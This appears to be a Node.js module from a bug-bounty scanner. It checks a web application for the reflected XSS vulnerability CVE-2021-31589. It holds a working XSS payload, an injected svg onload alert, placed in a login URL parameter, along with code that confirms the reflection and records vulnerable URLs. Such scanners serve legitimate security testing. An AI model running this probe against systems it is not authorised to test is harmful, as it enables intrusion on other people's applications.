#!/usr/bin/env node

/**
 * CVE-2021-31589
 * CVE-2021-31589 is a powerful scanner for bug bounty hunters and penetration testers to discover vulnerabilities in their web applications.
 *
 * @author karthikeyan V (karthithehacker) <https://karthithehacker.com>
 */

//lib and includes section 
 
var fs = require('fs');
const axios = require('axios');

// Function to scan a URL for CVE-2021-31589 vulnerability
class scan {
    constructor(urli,savepath) {
        async function scanUrlForCVE(url) {
            const payload = 'test%22%3E%3Csvg/onload=alert("XSS")%3E';
            const fullUrl = `${url}/appliance/login.ns?login%5Bpassword%5D=${payload}&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password`;
            const response = await axios.get(fullUrl, { validateStatus: null });
                
            if (response.data.includes('<svg/onload=alert("XSS")>')) {
                console.log(`\n\x1b[31;1m[CVE-2021-31589] \x1b[32;1mR-XSS found \x1b[37;1m===> \x1b[33;3m${fullUrl}\n`);
                if(savepath == null || savepath == true){
                        return;     
                        }
                else{
                    fs.appendFileSync(savepath, fullUrl+"\n", function (err) {
                    if (err) throw err;
                        });
                                
                    }  
            }
            
        }
        scanUrlForCVE(urli);
    }
}
module.exports = {
    scanner: scan
}